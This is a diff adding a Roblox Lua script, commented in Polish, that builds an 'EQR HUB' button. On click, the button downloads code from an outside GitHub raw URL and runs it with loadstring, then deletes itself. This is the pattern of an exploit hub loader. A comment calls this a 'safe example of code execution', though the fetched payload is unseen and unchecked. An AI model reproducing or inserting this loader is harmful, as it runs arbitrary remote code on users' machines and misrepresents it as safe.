@@ -1,0 +1,64 @@
+-- Sprawdzenie, czy GUI już nie istnieje, aby uniknąć duplikatów
+if game.Players.LocalPlayer.PlayerGui:FindFirstChild("EQR_HUB_GUI") then
+    return
+end
+
+-- ## TWORZENIE ELEMENTÓW GUI ##
+
+-- Główny kontener GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "EQR_HUB_GUI"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+screenGui.ResetOnSpawn = false -- KLUCZOWE: Zapobiega znikaniu GUI po śmierci postaci
+
+-- Główny przycisk
+local textButton = Instance.new("TextButton")
+textButton.Name = "RunButton"
+textButton.Parent = screenGui
+textButton.Size = UDim2.new(0, 220, 0, 60)
+textButton.Position = UDim2.new(0.5, 0, 0.5, 0)
+textButton.AnchorPoint = Vector2.new(0.5, 0.5)
+textButton.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+textButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+textButton.Font = Enum.Font.GothamBold
+textButton.TextSize = 22
+textButton.Text = "RUN EQR HUB"
+
+-- Ulepszenia wizualne
+local corner = Instance.new("UICorner") -- Dodaje zaokrąglone rogi
+corner.CornerRadius = UDim.new(0, 8)
+corner.Parent = textButton
+
+local stroke = Instance.new("UIStroke") -- Dodaje obramowanie
+stroke.Color = Color3.fromRGB(120, 120, 255)
+stroke.Thickness = 2
+stroke.Parent = textButton
+
+-- ## LOGIKA PRZYCISKU ##
+
+local czyKliknieto = false -- Zmienna do śledzenia, czy przycisk został już użyty
+
+textButton.MouseButton1Click:Connect(function()
+    -- Sprawdza, czy kod nie został już uruchomiony
+    if czyKliknieto then
+        return -- Zatrzymuje dalsze wykonywanie funkcji
+    end
+
+    -- Ustawia flagę na true, aby zablokować kolejne kliknięcia
+    czyKliknieto = true
+
+    -- Zmiana wyglądu przycisku, aby pokazać, że jest nieaktywny
+    textButton.Text = "EXECUTED"
+    textButton.TextColor3 = Color3.fromRGB(150, 150, 150)
+    stroke.Color = Color3.fromRGB(80, 80, 80)
+
+    -- BEZPIECZNY PRZYKŁAD WYKONANIA KODU
+    local bezpiecznyKod = game:HttpGet("https://raw.githubusercontent.com/slaby4346-sketch/ee/refs/heads/main/wl")
+    local funkcja = loadstring(bezpiecznyKod)
+    if funkcja then
+        pcall(funkcja) -- pcall zabezpiecza przed błędami w kodzie zewnętrznym
+    end
+
+    -- Natychmiastowe usunięcie całego GUI
+    screenGui:Destroy()
+end)
